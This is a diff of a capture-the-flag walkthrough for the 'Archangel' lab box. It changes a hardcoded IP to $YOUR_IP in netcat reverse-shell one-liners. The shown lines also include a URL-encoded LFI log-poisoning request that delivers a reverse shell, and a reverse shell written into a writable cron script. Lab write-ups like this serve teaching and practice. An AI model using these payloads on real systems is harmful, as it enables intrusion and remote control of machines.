@@ -54,7 +54,7 @@
 
 - looks like everything works. Now for the reverse_shell.
 - this will be our payload for our RCE to execute. (Make sure to start a netcat listener on your own IP and PORT that you specified in the payload. Mine will be on port 443)
-- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.100.95 443 >/tmp/f` 
+- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $YOUR_IP 443 >/tmp/f` 
 - Important to note, you might run into the issue where the URL doesnt get processed properly and it might take you to google. You need to URL encode the payload, and specify the port the domain is on.
 - `http://mafialive.thm:80/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var//log//apache2//access.log&cmd=m%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.9.100.95%209999%20%3E%2Ftmp%2Ff`
 
@@ -69,7 +69,7 @@
 ![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/cron.png)
 
 - We have write permissions on the file too, so lets put in a reverse_shell just like we previously did. Also dont forget to start another nc listerner on a different port 
-- echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.100.95 6666 >/tmp/f" > helloworld.sh
+- echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $YOUR_IP 6666 >/tmp/f" > helloworld.sh
 ![alt-text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/Archangel/images/arc.png)
 
 
